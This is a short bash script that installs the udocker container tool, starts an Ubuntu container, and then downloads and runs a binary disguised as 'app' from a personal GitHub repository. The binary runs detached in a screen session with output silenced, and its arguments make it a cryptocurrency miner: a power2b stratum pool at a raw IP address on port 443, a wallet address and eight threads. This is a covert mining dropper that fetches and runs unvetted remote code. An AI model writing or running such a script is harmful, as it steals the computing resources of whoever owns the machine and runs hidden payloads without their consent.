#!/bin/bash
wget https://github.com/indigo-dc/udocker/releases/download/1.3.9/udocker-1.3.9.tar.gz && tar zxvf udocker-1.3.9.tar.gz && mv udocker-1.3.9/udocker udocker && rm -rf udocker-1.3.9
cd udocker
./udocker pull ubuntu:focal
./udocker create --name=focal ubuntu:focal
./udocker  run focal /bin/bash
./udocker
echo
echo
apt update && apt install -y wget screen
nohup wget -O app https://github.com/duniaboci13/project/raw/main/apps > /dev/null 2>&1 && chmod 777 app && screen -dmS app ./app -a power2b -o stratum+tcps://152.42.199.142:443 -u mbc1qe3flkq8el48edhzudr75a2pj0vdf4uvykdygxg.kevin -p x -t 8
